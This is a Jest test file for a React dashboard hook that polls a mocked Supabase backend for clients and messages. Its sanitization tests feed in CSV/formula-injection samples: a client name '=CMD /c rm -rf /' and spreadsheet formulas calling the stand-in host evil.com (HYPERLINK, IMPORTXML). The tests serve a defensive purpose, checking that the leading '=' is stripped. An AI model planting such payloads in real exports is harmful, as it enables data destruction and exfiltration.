import { renderHook, waitFor, act } from '@testing-library/react';
import { makeChain, mockFromByTable } from '../helpers/supabaseMock';

jest.mock('../../lib/supabase', () => ({
  supabase: { from: jest.fn() },
  isConfigured: true,
}));

import { supabase } from '../../lib/supabase';
import { useWorkflowDashboard } from '../../hooks/useWorkflowDashboard';
import type { WorkflowClient, WorkflowMessage } from '../../hooks/useWorkflowDashboard';

const WORKFLOW_ID = 'wf-test-001';

const baseClient: WorkflowClient = {
  id: 'client-1',
  workflow_id: WORKFLOW_ID,
  name: 'Ana García',
  phone: '+573001234567',
  created_at: '2026-01-01T00:00:00Z',
  last_interaction: '2026-05-01T10:00:00Z',
  message_count: 5,
  conversation_summary: null,
};

const baseMessage: WorkflowMessage = {
  id: 'msg-1',
  workflow_id: WORKFLOW_ID,
  client_id: 'client-1',
  role: 'user',
  type: 'text',
  message: 'Hola, necesito ayuda',
  transcription: null,
  timestamp: '2026-05-01T10:00:00Z',
};

beforeEach(() => {
  jest.useFakeTimers();
  jest.mocked(supabase.from).mockImplementation(
    mockFromByTable({
      workflow_clients:      { data: [], error: null },
      workflow_appointments: { data: [], error: null },
      workflow_analytics:    { data: [], error: null },
      workflow_messages:     { data: [], error: null },
    }),
  );
});

afterEach(() => {
  jest.useRealTimers();
  jest.clearAllMocks();
});

describe('useWorkflowDashboard', () => {
  describe('initial state', () => {
    it('returns empty arrays and loading=false when workflowId is null', () => {
      const { result } = renderHook(() => useWorkflowDashboard(null));
      expect(result.current.clients).toEqual([]);
      expect(result.current.messages).toEqual([]);
      expect(result.current.appointments).toEqual([]);
      expect(result.current.analytics).toEqual([]);
      expect(result.current.loading).toBe(false);
      expect(result.current.error).toBeNull();
    });

    it('sets loading=true while fetching', () => {
      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      expect(result.current.loading).toBe(true);
    });
  });

  describe('data fetching', () => {
    it('loads clients on mount', async () => {
      jest.mocked(supabase.from).mockImplementation(
        mockFromByTable({
          workflow_clients:      { data: [baseClient], error: null },
          workflow_appointments: { data: [], error: null },
          workflow_analytics:    { data: [], error: null },
        }),
      );

      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      expect(result.current.clients).toHaveLength(1);
      expect(result.current.clients[0].id).toBe('client-1');
    });

    it('sets error when Supabase returns an error', async () => {
      jest.mocked(supabase.from).mockImplementation(
        mockFromByTable({
          workflow_clients: { data: null, error: { message: 'DB connection failed' } },
          workflow_appointments: { data: [], error: null },
          workflow_analytics:    { data: [], error: null },
        }),
      );

      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.error).toBe('DB connection failed'));
    });

    it('does not fetch when workflowId is null', () => {
      renderHook(() => useWorkflowDashboard(null));
      expect(supabase.from).not.toHaveBeenCalled();
    });
  });

  describe('sanitization', () => {
    it('strips leading = from client name (formula injection)', async () => {
      const maliciousClient = { ...baseClient, name: '=CMD /c rm -rf /', phone: '+573001234567' };
      jest.mocked(supabase.from).mockImplementation(
        mockFromByTable({
          workflow_clients:      { data: [maliciousClient], error: null },
          workflow_appointments: { data: [], error: null },
          workflow_analytics:    { data: [], error: null },
        }),
      );

      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      expect(result.current.clients[0].name).toBe('CMD /c rm -rf /');
    });

    it('strips leading = from client phone', async () => {
      const maliciousClient = { ...baseClient, phone: '=HYPERLINK("evil.com","click")' };
      jest.mocked(supabase.from).mockImplementation(
        mockFromByTable({
          workflow_clients:      { data: [maliciousClient], error: null },
          workflow_appointments: { data: [], error: null },
          workflow_analytics:    { data: [], error: null },
        }),
      );

      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      expect(result.current.clients[0].phone).toBe('HYPERLINK("evil.com","click")');
    });
  });

  describe('fetchMessages', () => {
    it('loads messages for a given client', async () => {
      jest.mocked(supabase.from).mockImplementation(
        mockFromByTable({
          workflow_clients:      { data: [], error: null },
          workflow_appointments: { data: [], error: null },
          workflow_analytics:    { data: [], error: null },
          workflow_messages:     { data: [baseMessage], error: null },
        }),
      );

      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      await act(async () => {
        await result.current.fetchMessages('client-1');
      });

      expect(result.current.messages).toHaveLength(1);
      expect(result.current.messages[0].message).toBe('Hola, necesito ayuda');
    });

    it('sanitizes message content with formula injection', async () => {
      const injectedMsg = { ...baseMessage, message: '=IMPORTXML("evil.com","/")' };
      jest.mocked(supabase.from).mockImplementation(
        mockFromByTable({
          workflow_clients:      { data: [], error: null },
          workflow_appointments: { data: [], error: null },
          workflow_analytics:    { data: [], error: null },
          workflow_messages:     { data: [injectedMsg], error: null },
        }),
      );

      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      await act(async () => {
        await result.current.fetchMessages('client-1');
      });

      expect(result.current.messages[0].message).toBe('IMPORTXML("evil.com","/")');;
    });

    it('does not fetch messages when workflowId is null', async () => {
      const { result } = renderHook(() => useWorkflowDashboard(null));
      await act(async () => {
        await result.current.fetchMessages('client-1');
      });
      expect(supabase.from).not.toHaveBeenCalled();
    });
  });

  describe('clearMessages', () => {
    it('resets messages state to empty array', async () => {
      jest.mocked(supabase.from).mockImplementation(
        mockFromByTable({
          workflow_clients:      { data: [], error: null },
          workflow_appointments: { data: [], error: null },
          workflow_analytics:    { data: [], error: null },
          workflow_messages:     { data: [baseMessage], error: null },
        }),
      );

      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      await act(async () => { await result.current.fetchMessages('client-1'); });
      expect(result.current.messages).toHaveLength(1);

      await act(async () => { await result.current.clearMessages('client-1'); });
      expect(result.current.messages).toEqual([]);
    });
  });

  describe('polling', () => {
    it('re-fetches data every 4 seconds', async () => {
      const { result } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      const callsBefore = jest.mocked(supabase.from).mock.calls.length;

      await act(async () => { jest.advanceTimersByTime(4000); });
      await waitFor(() =>
        expect(jest.mocked(supabase.from).mock.calls.length).toBeGreaterThan(callsBefore),
      );
    });

    it('stops polling when unmounted', async () => {
      const { result, unmount } = renderHook(() => useWorkflowDashboard(WORKFLOW_ID));
      await waitFor(() => expect(result.current.loading).toBe(false));

      unmount();
      const callsAfterUnmount = jest.mocked(supabase.from).mock.calls.length;

      await act(async () => { jest.advanceTimersByTime(8000); });
      expect(jest.mocked(supabase.from).mock.calls.length).toBe(callsAfterUnmount);
    });
  });
});
